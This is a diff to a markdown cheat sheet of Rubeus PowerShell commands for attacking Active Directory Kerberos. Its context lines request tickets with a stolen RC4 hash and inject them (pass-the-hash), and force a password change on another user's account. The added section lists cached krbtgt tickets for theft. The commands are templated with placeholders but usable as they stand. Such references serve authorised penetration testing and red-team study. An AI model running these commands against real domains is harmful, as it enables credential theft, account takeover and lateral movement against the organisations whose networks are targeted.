@@ -47,3 +47,8 @@ Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
 Invoke-Rubeus 'asktgt /user:<user_can_change_passwords> /changepw /rc4:<hash> /domain:<domain> /outfile:<user_can_change_passwords>.ticket'
 Invoke-Rubeus 'changepw /ticket:<user_can_change_passwords>.ticket /new:<new_password> /targetuser:<domain.local>\<user_to_change_password> /dc:<dc>.<domain>.local'
 ```
+
+## List all tickets filter by service krbtgt
+```powershell
+Invoke-Rubeus 'triage /service:krbtgt'
+```
